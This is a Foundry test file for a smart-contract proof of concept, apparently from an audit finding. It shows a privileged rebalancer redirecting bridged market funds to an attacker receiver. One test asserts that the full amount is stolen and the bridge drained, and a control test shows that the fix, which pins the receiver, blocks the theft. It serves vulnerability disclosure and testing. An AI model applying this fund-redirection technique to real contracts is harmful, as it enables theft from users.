// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    EverclearBridge,
    EverclearBridgeFixed,
    MockRoles,
    MockFeeAdapter,
    MiniToken,
    IFeeAdapter
} from "./62723-h-1-rebalancer-can-steal-funds-from-markets-by-sending-to-cu.sol";

contract RebalancerUncheckedReceiverTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant MARKET = 0x00000000000000000000000000000000000A4e70;
    uint32 internal constant DST_CHAIN_ID = 8453;
    uint256 internal constant AMOUNT = 1000 ether;

    function test_exploit_rebalancerRoutesMarketFundsToAttacker() public {
        Exploit e = new Exploit();

        // Before: the bridge holds the market's 1000e18 extracted for rebalancing;
        // the attacker holds nothing.
        MiniToken token = MiniToken(e.inputAssetAddr());
        assertEq(token.balanceOf(e.bridgeAddr()), AMOUNT, "bridge holds extracted market funds");
        assertEq(token.balanceOf(ATTACKER), 0, "attacker starts empty");

        e.run();

        // HARM: the full 1000e18 is delivered to the attacker-controlled receiver;
        // the destination market received nothing; the bridge is drained.
        assertEq(e.attackerStolen(), AMOUNT, "attacker received the full extracted amount");
        assertEq(e.marketReceived(), 0, "destination market received nothing");
        assertEq(e.bridgeRemaining(), 0, "bridge drained");
        assertEq(token.balanceOf(ATTACKER), AMOUNT, "token balance confirms theft at attacker EOA");
    }

    /// @dev Negative control: the team fix pins params.receiver == _market, so the
    ///      identical malicious message can no longer redirect funds — they reach
    ///      the legitimate market and the attacker gets zero.
    function test_control_fixedReceiverPinning_fundsReachMarket() public {
        MiniToken token = new MiniToken("Stolen Input Asset", "STOLEN-inputAsset");
        MockRoles roles = new MockRoles(address(this)); // this test contract is the rebalancer
        MockFeeAdapter feeAdapter = new MockFeeAdapter();
        EverclearBridgeFixed bridge = new EverclearBridgeFixed(address(roles), address(feeAdapter));

        token.mint(address(bridge), AMOUNT);

        // Identical malicious message: receiver = attacker.
        bytes memory message = _buildMessage(address(token), bytes32(uint256(uint160(ATTACKER))));
        bridge.sendMsg(AMOUNT, MARKET, DST_CHAIN_ID, address(token), message, "");

        assertEq(token.balanceOf(ATTACKER), 0, "fixed: attacker gets nothing");
        assertEq(token.balanceOf(MARKET), AMOUNT, "fixed: funds reach the legitimate market");
        assertEq(token.balanceOf(address(bridge)), 0, "fixed: bridge forwarded to market");
    }

    function _buildMessage(address inputAsset, bytes32 receiver) internal pure returns (bytes memory) {
        uint32[] memory destinations = new uint32[](1);
        destinations[0] = DST_CHAIN_ID;

        IFeeAdapter.FeeParams memory feeParams = IFeeAdapter.FeeParams({fee: 0, deadline: 0, sig: ""});

        bytes memory body = abi.encode(
            destinations,
            receiver,
            inputAsset,
            bytes32(0),
            AMOUNT,
            uint24(0),
            uint48(0),
            bytes(""),
            feeParams
        );
        return abi.encodePacked(bytes4(0xdeadbeef), body);
    }
}
